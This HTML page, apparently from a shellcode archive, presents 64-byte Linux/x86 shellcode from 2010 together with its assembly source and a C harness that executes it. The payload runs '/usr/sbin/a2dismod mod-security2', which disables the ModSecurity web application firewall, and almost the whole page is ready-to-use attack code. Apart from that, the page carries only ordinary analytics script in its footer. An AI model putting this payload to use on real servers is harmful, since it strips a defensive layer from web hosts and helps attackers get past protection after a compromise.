<html><head><title>Linux/x86 - disabled modsecurity - 64 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* sekfault@shellcode.com.ar - Goodfellas Security Research Team - 2010
 * /usr/sbin/a2dismod mod-security2 - disable modsecurity
 * 64 bytes
 *__asm__(
 *                &quot;xor %eax,%eax \n&quot;
 *                 &quot;push %eax \n&quot;
 *                 &quot;cdq \n&quot;
 *                 &quot;push $0x646f6d73 \n&quot;
 *                 &quot;push $0x69643261 \n&quot;
 *                 &quot;push $0x2f6e6962 \n&quot;
 *                 &quot;push $0x732f7273 \n&quot;
 *                 &quot;push $0x752f2f2f \n&quot;
 *                 &quot;mov %esp,%ebx \n&quot;
 *                 &quot;push $0x32 \n&quot;
 *                 &quot;push $0x79746972 \n&quot;
 *                 &quot;push $0x75636573 \n&quot;
 *                 &quot;push $0x2d646f6d \n&quot;
 *                 &quot;mov %esp,%ecx \n&quot;
 *                 &quot;xor %edx,%edx \n&quot;
 *                 &quot;mov $0xb,%al \n&quot;
 *                 &quot;push %edx \n&quot;
 *                 &quot;push %ecx \n&quot;
 *                 &quot;push %ebx \n&quot;
 *                 &quot;mov %esp,%ecx \n&quot;
 *                 &quot;mov %esp,%edx \n&quot;
 *                 &quot;int $0x80 \n&quot;
                   );
 */
char shellcode[]=&quot;\x31\xc0\x50\x99\x68\x73\x6d\x6f\x64\x68\x61\x32\x64\x69\x68\x62\x69\x6e\x2f\x68\x73\x72\x2f\x73\x68\x2f\x2f\x2f\x75\x89\xe3\x6a\x32\x68\x72\x69\x74\x79\x68\x73\x65\x63\x75\x68\x6d\x6f\x64\x2d\x89\xe1\x31\xd2\xb0\x0b\x52\x51\x53\x89\xe1\x89\xe2\xcd\x80&quot;;
 
int main()
{
        (*(void(*)())shellcode)();
        return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
